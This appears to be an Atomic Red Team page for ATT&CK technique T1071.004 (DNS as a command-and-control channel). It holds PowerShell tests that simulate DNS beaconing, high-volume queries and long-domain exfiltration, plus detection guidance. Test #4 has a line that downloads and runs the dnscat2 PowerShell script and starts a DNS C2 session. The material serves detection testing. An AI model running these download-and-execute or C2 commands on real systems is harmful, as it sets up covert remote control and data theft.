# T1071.004 - Application Layer Protocol: DNS
Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) 

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - DNS Large Query Volume
This test simulates an infected host sending a large volume of DNS queries to a command and control server.
The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
```

Invoke-AtomicTest T1071.004 -TestNumbers 1

### Atomic Test #2 - DNS Regular Beaconing
This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
```

Invoke-AtomicTest T1071.004 -TestNumbers 2

### Atomic Test #3 - DNS Long Domain Query
This test simulates an infected host returning data to a command and control server using long domain names.
The simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.
 Upon execution, DNS information about the domain will be displayed for each callout.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Set-Location PathToAtomicsFolder
.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
```

Invoke-AtomicTest T1071.004 -TestNumbers 3

### Atomic Test #4 - DNS C2
This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
The following blogs have more information.

https://github.com/iagox86/dnscat2

https://github.com/lukebaggett/dnscat2-powershell

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
```

Invoke-AtomicTest T1071.004 -TestNumbers 4

## Detection
Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)

Monitor for DNS traffic to/from known-bad or suspicious domains.